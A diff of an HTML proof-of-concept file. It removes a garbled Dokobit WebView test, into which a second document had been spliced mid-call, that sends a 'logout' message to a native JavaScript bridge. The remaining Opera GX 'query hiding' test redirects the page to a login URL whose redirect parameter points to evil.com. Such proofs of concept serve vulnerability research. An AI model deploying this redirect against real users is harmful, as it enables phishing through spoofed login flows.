@@ -1,19 +1,4 @@
-<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Dokobit WebView PoC</title>
-</head>
-<body>
-  <h2>Dokobit WebView PoC</h2>
-  <button onclick="test()">Trigger Native</button>
-
-  <script>
-    function test() {
-      try {
-        // kirim pesan ke interface "DokobitListener"
-        DokobitListener.postMessage(
-          JSON.stringify({<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
   <title>Opera GX Query Hiding PoC</title>
@@ -31,19 +16,6 @@
     setTimeout(() => {
       window.location = "https://example.com/login?redirect=https://evil.com";
     }, 2000);
-  </script>
-</body>
-</html>
-
-            message: "logout",
-            note: "PoC test from JS"
-          })
-        );
-        alert("PoC sent: DokobitListener.postMessage()");
-      } catch (e) {
-        alert("Error: " + e);
-      }
-    }
   </script>
 </body>
 </html>
